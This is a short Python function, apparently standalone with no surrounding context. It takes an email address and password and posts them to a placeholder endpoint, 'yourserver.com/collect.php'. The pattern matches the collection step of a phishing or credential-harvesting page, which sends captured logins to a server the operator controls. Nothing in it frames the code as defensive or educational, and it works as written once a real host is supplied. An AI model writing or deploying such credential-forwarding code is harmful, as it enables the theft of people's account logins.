import requests

def collect_data(email, password):
    url = "https://yourserver.com/collect.php"
    data = {
        'email': email,
        'password': password
    }
    try:
        response = requests.post(url, data=data)
        if response.status_code == 200:
            return True
        else:
            return False
    except requests.exceptions.RequestException as e:
        print(e)
        return False